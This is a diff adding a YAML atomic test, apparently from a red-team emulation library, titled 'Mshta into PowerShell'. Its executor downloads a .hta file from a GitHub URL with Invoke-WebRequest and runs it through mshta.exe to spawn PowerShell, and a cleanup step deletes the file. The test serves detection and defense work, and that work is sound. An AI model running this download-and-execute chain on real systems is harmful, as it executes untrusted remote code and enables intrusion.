@@ -1,0 +1,27 @@
+attack_technique: T002
+display_name: 'Mshta into PowerShell'
+atomic_tests:
+- name: Mshta into PowerShell
+  auto_generated_guid: f92a380f-ced9-491f-b338-95a991418ce2
+  description: |
+    Methods to remotely download a .hta file, run it with mshta.exe to execute .hta file that will execute PowerShell command.
+    When sucessfully executed, PowerShell.exe is a child process of mshta.exe
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_path:
+      description: location to save file 
+      type: string
+      default: $env:public\basic.hta
+    file_url:
+      description: URL to download the file
+      type: string
+      default: https://raw.githubusercontent.com/HakkYahud/hakkyahud.github.io/main/basic.hta
+  executor:
+    command: |
+      $file = Invoke-WebRequest "#{file_url}"
+      $file.content | out-file "#{file_path}"
+      mshta "#{file_path}"
+    cleanup_command:
+      remove-item "#{file_path}" -ErrorAction Ignore
+    name: powershell
